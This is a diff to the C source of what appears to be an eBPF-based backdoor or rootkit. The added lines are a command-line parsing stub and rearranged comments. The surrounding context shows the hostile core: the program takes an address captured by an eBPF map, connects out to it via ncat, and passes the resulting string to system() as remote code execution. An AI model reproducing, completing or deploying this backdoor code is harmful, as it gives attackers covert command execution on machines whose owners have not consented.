@@ -54,16 +54,46 @@ printf("   ╚═════╝  ╚═════╝  ╚═════╝ �
 printf("\n\n");
 }
 
+void clisetup(int argc, char **argv) {
+  int i = 0;
+  for (i = 0; i < argc; i++)
+  {
+    if (argv[i][0] == '-')
+    {
+      switch (argv[i][1])
+      {
+      case 'v':
+        //Verbose
+        //cfg.verbose = 1;
+        break;
+      case 'h':
+        //Host
+        //cfg.ip = argv[i + 1];
+        break;
+      case 'p':
+        //Port
+        //cfg.port = atoi(argv[i + 1]);
+        break;
+      case 'm':
+        //Message
+        //cfg.message = argv[i + 1];
+        break;
+      }
+    }
+  }
+}
+
 // main
 //
 // The primary program entry point and argument handling
 int main(int argc, char **argv) {
   asciiheader();
+  clisetup(argc, argv);
 
-  // Return value for eBPF loading
-  int loaded;
 
   printf("-----------------------------------------------\n");
+  // Return value for eBPF loading
+  int loaded;
 
   // ===========================================================================
   // Safe probes
@@ -142,9 +172,7 @@ int main(int argc, char **argv) {
     // Boop map management
     //
     int ikey = 0, jkey, err;
-    // Saturn Valley. If you know, you know.
-    char saddrval[INET_ADDRSTRLEN];
-    // Return protocol from eBPF
+    char saddrval[INET_ADDRSTRLEN]; // Saturn Valley. If you know, you know.
     struct tcp_return ret;
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
       err = bpf_map_lookup_elem(fd, &ikey, &jkey);
@@ -154,6 +182,8 @@ int main(int argc, char **argv) {
       // TODO: Add denylist of saddrvals
       inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
       printf("Reverse lookup for RCE. Connecting out: %s\n", saddrval);
+
+      // ---
       char cmd[1024];
       char rce[1024];
       // TODO: Remove ncat and execute a socket directly in C
@@ -168,7 +198,7 @@ int main(int argc, char **argv) {
         printf("RCE: %s\n", rce);
         system(rce);
       }
-
+      // ---
       err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
         return 0;
